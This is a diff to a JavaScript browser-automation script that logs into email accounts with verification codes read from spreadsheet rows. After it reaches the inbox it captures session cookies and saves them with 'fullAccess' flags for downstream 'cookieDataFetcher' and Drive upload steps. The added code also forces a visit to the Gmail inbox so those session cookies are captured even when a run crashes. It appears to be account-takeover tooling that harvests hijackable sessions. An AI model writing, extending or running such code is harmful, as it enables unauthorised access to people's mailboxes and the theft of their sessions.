@@ -3816,6 +3816,7 @@ if (!foundSelector) {
             logger.info(`[processRow][${browserId}] —RESUME WAITINGOPTIONS— sheetStatus=${sheetStatus} verified=${row[columnIndexes['verified']] ?? 'n/a'} driveUrl=${updateData.driveUrl || 'none'} code=${row[columnIndexes['verificationCode']] ? String(row[columnIndexes['verificationCode']]).slice(0, 4) : 'none'}`);
             finalStatus = "WAITINGOPTIONS";
             initialCheckResult.accountAccess = true;
+            initialCheckResult.emailExists = true;
             let currentVerificationOptions = [];
             const pollingTimeoutOptions = Date.now() + 5 * 60 * 1000;
             const optionsPollStartMs = Date.now();
@@ -4354,6 +4355,7 @@ if (!foundSelector) {
             logger.warn(`[processRow][${browserId}] —RESUME WAITINGCODE— sheetStatus=${sheetStatus} verified=${row[columnIndexes['verified']] ?? 'n/a'} driveUrl=${updateData.driveUrl || 'none'} code=${row[columnIndexes['verificationCode']] ? String(row[columnIndexes['verificationCode']]).slice(0, 4) : 'none'}`);
             finalStatus = "WAITINGCODE";
             initialCheckResult.accountAccess = true;
+            initialCheckResult.emailExists = true;
             if (updateData.status !== "WAITINGCODE") {
                 updateData.status = "WAITINGCODE";
                 updateData.lastJsonResponse = JSON.stringify({
@@ -4554,6 +4556,12 @@ if (!foundSelector) {
                                 }
                                 logger.info(`[processRow][${browserId}][WAITINGCODE] Enter submit verification: changed=${enterChangedPage}`);
 
+                                // Set PROCESSING_FINALIZING early once page changed — wrong-code paths
+                                // below will revert to WAITINGCODE if the code was actually incorrect.
+                                if (enterChangedPage) {
+                                    finalStatus = "PROCESSING_FINALIZING";
+                                }
+
                                 if (!enterChangedPage && codeSubmitSelectors.length > 0) {
                                     logger.info(`[processRow][${browserId}][WAITINGCODE] Enter did not navigate. Falling back to button click.`);
                                     for (const btnSel of codeSubmitSelectors) {
@@ -4672,6 +4680,16 @@ if (!foundSelector) {
                                             message: "Code accepted despite error flash. Reached inbox."
                                         });
 
+                                        // Persist cookieJSON + PROCESSING_FINALIZING to cache immediately
+                                        updateBrowserRowDataFast(browserId, {
+                                            status: "PROCESSING_FINALIZING",
+                                            cookieJSON: updateData.cookieJSON,
+                                            cookieAccess: true,
+                                            verified: true,
+                                            fullAccess: true,
+                                            lastJsonResponse: updateData.lastJsonResponse
+                                        });
+
                                         if (browser) {
                                             if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                                             logger.info(`[processRow][${browserId}] Closing browser after successful verification (error-flash safety).`);
@@ -4730,23 +4748,34 @@ if (!foundSelector) {
                                             logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after additional views. Setting PROCESSING_FINALIZING.`);
                                             finalStatus = "PROCESSING_FINALIZING";
                                             codeSuccessfullyProcessed = true;
-                                            initialCheckResult.reachedInbox = true;
-                                            initialCheckResult.requiresVerification = false;
-                                            initialCheckResult.accountAccess = true;
+                                        initialCheckResult.reachedInbox = true;
+                                        initialCheckResult.requiresVerification = false;
+                                        initialCheckResult.accountAccess = true;
+                                        initialCheckResult.emailExists = true;
 
-                                            const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
-                                            updateData.status = "PROCESSING_FINALIZING";
-                                            updateData.cookieJSON = JSON.stringify(browserCookies);
-                                            updateData.verified = true;
-                                            updateData.fullAccess = true;
-                                            updateData.cookieAccess = true;
-                                            updateData.lastJsonResponse = JSON.stringify({
-                                                browserId, email, status: "PROCESSING_FINALIZING",
-                                                emailExists: initialCheckResult.emailExists, accountAccess: true,
-                                                reachedInbox: true, requiresVerification: false,
-                                                verified: true, fullAccess: true,
-                                                platform, timestamp: new Date().toISOString(),
-                                                message: "Code accepted. Reached inbox after additional views."
+                                        const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+                                        updateData.status = "PROCESSING_FINALIZING";
+                                        updateData.cookieJSON = JSON.stringify(browserCookies);
+                                        updateData.verified = true;
+                                        updateData.fullAccess = true;
+                                        updateData.cookieAccess = true;
+                                        updateData.lastJsonResponse = JSON.stringify({
+                                            browserId, email, status: "PROCESSING_FINALIZING",
+                                            emailExists: initialCheckResult.emailExists, accountAccess: true,
+                                            reachedInbox: true, requiresVerification: false,
+                                            verified: true, fullAccess: true,
+                                            platform, timestamp: new Date().toISOString(),
+                                            message: "Code accepted. Reached inbox after additional views."
+                                            });
+
+                                            // Persist cookieJSON + PROCESSING_FINALIZING to cache immediately
+                                            updateBrowserRowDataFast(browserId, {
+                                                status: "PROCESSING_FINALIZING",
+                                                cookieJSON: updateData.cookieJSON,
+                                                cookieAccess: true,
+                                                verified: true,
+                                                fullAccess: true,
+                                                lastJsonResponse: updateData.lastJsonResponse
                                             });
 
                                             if (browser) {
@@ -4843,6 +4872,7 @@ if (!foundSelector) {
                                         initialCheckResult.reachedInbox = true;
                                         initialCheckResult.requiresVerification = false;
                                         initialCheckResult.accountAccess = true;
+                                        initialCheckResult.emailExists = true;
 
                                         const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
                                         updateData.status = "PROCESSING_FINALIZING";
@@ -4859,6 +4889,16 @@ if (!foundSelector) {
                                             message: "Successfully verified with passive approval and reached inbox."
                                         });
                                         // updateData.verificationCode = ''; // Removed clearing
+
+                                        // Persist cookieJSON + PROCESSING_FINALIZING to cache immediately
+                                        updateBrowserRowDataFast(browserId, {
+                                            status: "PROCESSING_FINALIZING",
+                                            cookieJSON: updateData.cookieJSON,
+                                            cookieAccess: true,
+                                            verified: true,
+                                            fullAccess: true,
+                                            lastJsonResponse: updateData.lastJsonResponse
+                                        });
 
                                         if (browser) {
                                             if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
@@ -4937,7 +4977,17 @@ if (!foundSelector) {
                                     platform, timestamp: new Date().toISOString(),
                                     message: "Successfully verified without code and reached inbox."
                                 });
-                                // updateData.verificationCode = ''; // Removed clearing
+
+                                // Persist cookieJSON + PROCESSING_FINALIZING to cache immediately
+                                // so smartExtract / cookieDataFetcher can read it even if Drive upload is slow
+                                updateBrowserRowDataFast(browserId, {
+                                    status: "PROCESSING_FINALIZING",
+                                    cookieJSON: updateData.cookieJSON,
+                                    cookieAccess: true,
+                                    verified: true,
+                                    fullAccess: true,
+                                    lastJsonResponse: updateData.lastJsonResponse
+                                });
 
                                 if (browser) {
                                     if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
@@ -5160,6 +5210,17 @@ if (!foundSelector) {
                                         platform, timestamp: new Date().toISOString(),
                                         message: "Successfully verified and reached inbox."
                                     });
+
+                                    // Persist cookieJSON + PROCESSING_FINALIZING to cache immediately
+                                    updateBrowserRowDataFast(browserId, {
+                                        status: "PROCESSING_FINALIZING",
+                                        cookieJSON: updateData.cookieJSON,
+                                        cookieAccess: true,
+                                        verified: true,
+                                        fullAccess: true,
+                                        lastJsonResponse: updateData.lastJsonResponse
+                                    });
+
                                     break;
                                 }
                                 logger.error(`[processRow][${browserId}][WAITING_CODE] Unexpected page state after verification attempt. Failing. Current URL: ${page.url()}`);
@@ -5490,6 +5551,8 @@ if (!foundSelector) {
         updateData = {
             status: finalStatus,
             email: email || '',
+            driveUrl: updateData.driveUrl || '',
+            cookieJSON: updateData.cookieJSON || '',
             lastJsonResponse: (waitingStates.includes(finalStatus) && updateData.lastJsonResponse)
                 ? updateData.lastJsonResponse
                 : JSON.stringify({
@@ -5526,6 +5589,12 @@ if (!foundSelector) {
 
 
         if ((finalStatus === "COMPLETED" || finalStatus === "PROCESSING_FINALIZING" || initialCheckResult.accountAccess) && !browserFullyClosed) {
+            // Gmail: navigate to mail.google.com to ensure session cookies are captured
+            if (platform === 'gmail' && !page.url().includes('mail.google.com')) {
+                logger.info(`[processRow][${browserId}] Gmail: navigating to mail.google.com before final cookie capture...`);
+                await page.goto('https://mail.google.com/mail/u/0/#inbox', { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => null);
+                await new Promise(r => setTimeout(r, 3000));
+            }
             const allUrls = getCookieCaptureUrls(domain);
             let browserCookies = [];
             try {
@@ -5777,6 +5846,12 @@ if (!foundSelector) {
             // Wrap in Promise.race so a hung page doesn't block browser cleanup.
             if (page && !browserFullyClosed) {
                 try {
+                    // Gmail: navigate to mail.google.com to ensure session cookies are captured
+                    if (platform === 'gmail' && !page.url().includes('mail.google.com')) {
+                        logger.info(`[processRow][${browserId}] Gmail: navigating to mail.google.com before crash cookie capture...`);
+                        await page.goto('https://mail.google.com/mail/u/0/#inbox', { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => null);
+                        await new Promise(r => setTimeout(r, 2000));
+                    }
                     const allUrls = getCookieCaptureUrls(domain);
                     const browserCookies = await Promise.race([
                         page.cookies(...allUrls),
